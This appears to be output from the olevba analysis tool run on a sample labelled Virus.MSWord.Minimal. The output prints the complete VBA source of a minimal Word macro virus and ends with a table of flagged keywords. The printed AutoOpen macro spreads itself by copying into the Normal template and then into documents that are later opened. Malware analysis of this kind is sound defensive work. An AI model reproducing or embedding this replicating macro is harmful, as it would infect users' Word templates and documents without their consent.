olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoopen.bas 
in file: Virus.MSWord.Minimal - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
' Vesselin Bontchev
'
Function CopyMac(src, Tgt) As Long
On Error GoTo EndCopyMac
Application.OrganizerCopy _
   Source:=src, _
   Destination:=Tgt, _
   Name:="AutoOpen", _
   Object:=wdOrganizerObjectProjectItems
EndCopyMac:
CopyMac = Err.Number
On Error GoTo 0
End Function
Sub MAIN()
doc$ = ActiveDocument.FullName
gen$ = NormalTemplate.FullName
ret = CopyMac(doc$, gen$)
If (ret = 5940) Then
    ret = CopyMac(gen$, doc$)
  If (ret = 0) Then
     ActiveDocument.SaveAs _
        FileName:=doc$, _
        FileFormat:=wdFormatTemplate
  End If
End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

